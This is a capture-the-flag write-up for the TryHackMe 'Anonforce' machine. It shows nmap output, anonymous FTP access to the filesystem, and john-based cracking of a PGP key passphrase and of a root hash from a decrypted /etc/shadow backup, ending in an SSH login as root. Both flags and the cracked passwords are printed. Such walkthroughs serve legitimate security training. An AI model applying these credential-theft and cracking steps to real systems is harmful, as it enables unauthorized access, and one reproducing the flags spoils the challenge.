# Anonforce

boot2root machine for FIT and bsides guatemala CTF

# #1 - user.txt

Let's do a Nmap scan:

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jun 21 01:05 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  102 0        0               0 Jun 21 01:05 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Jun 21 01:05 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Jun 21 01:05 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

2 ports are open: 21 (FTP) and 22 (SSH). The FTP service allows full read access of the `/` on the server with anonymous access.

Something immediately seems interesting. There is a `/noteread` directory.

Let's first get the user flag:

~~~
$ ftp 10.10.133.140
Connected to 10.10.133.140 (10.10.133.140).
220 (vsFTPd 3.0.3)
Name (10.10.133.140:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd home
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (10,10,133,140,85,40).
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (10,10,133,140,225,0).
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x    3 0        0            4096 Aug 11  2019 ..
-rw-------    1 0        0             117 Aug 11  2019 .bash_history
-rw-r--r--    1 1000     1000          220 Aug 11  2019 .bash_logout
-rw-r--r--    1 1000     1000         3771 Aug 11  2019 .bashrc
drwx------    2 1000     1000         4096 Aug 11  2019 .cache
drwxrwxr-x    2 1000     1000         4096 Aug 11  2019 .nano
-rw-r--r--    1 1000     1000          655 Aug 11  2019 .profile
-rw-r--r--    1 1000     1000            0 Aug 11  2019 .sudo_as_admin_successful
-rw-r--r--    1 0        0             183 Aug 11  2019 .wget-hsts
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> get user.txt
~~~

Here is the content of the flag:

~~~
$ cat user.txt 
606083fd33beb1284fc51f411a706af8
~~~

# #2 - root.txt

The `/notread` directory contains 2 files: 

* `backup.pgp`
* `private.asc`

Trying to import private.asc requires a password.

~~~
$ gpg --import private.asc 
gpg: /home/unknown/.gnupg/trustdb.gpg: trustdb created
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2/B92CD1F280AD82C2: error sending to agent: Operation cancelled
gpg: error reading 'private.asc': Operation cancelled
gpg: import from 'private.asc' failed: Operation cancelled
gpg: Total number processed: 0
gpg:               imported: 1
gpg:       secret keys read: 1
~~~

Let's crack the `private.asc` key:

~~~
$ /data/src/john/run/gpg2john private.asc > pgp.hash

File private.asc
unknown@localhost:/data/documents/challenges/TryHackMe/__Anonforce/files$ /data/src/john/run/john pgp.hash --wordlist=/data/src/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
1g 0:00:02:25 20.78% (ETA: 10:46:24) 0.006870g/s 21931p/s 21931c/s 21931C/s tinoco09..tinocat
Session aborted
~~~

Now that we have the password (`xbox360`), let's import the key and decrypt the message:

~~~
$ gpg --import private.asc 
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
$ gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::
~~~

This backup file seems to be a copy of `/etc/shadow`. Let's crack the passwords.

~~~
$ /data/src/john/run/john backup --wordlist=/data/src/wordlists/rockyou.txt 
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)
1g 0:00:00:01 DONE (2020-06-21 10:42) 0.7462g/s 5349p/s 5349c/s 5349C/s honeybear..droopy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

We have successfully retrieved the `root` password: `hikari`. Let's connect with SSH and get the flag:

~~~
$ ssh root@10.10.133.140
root@10.10.133.140's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# cat root.txt 
f706456440c7af4187810c31c6cebdce
~~~
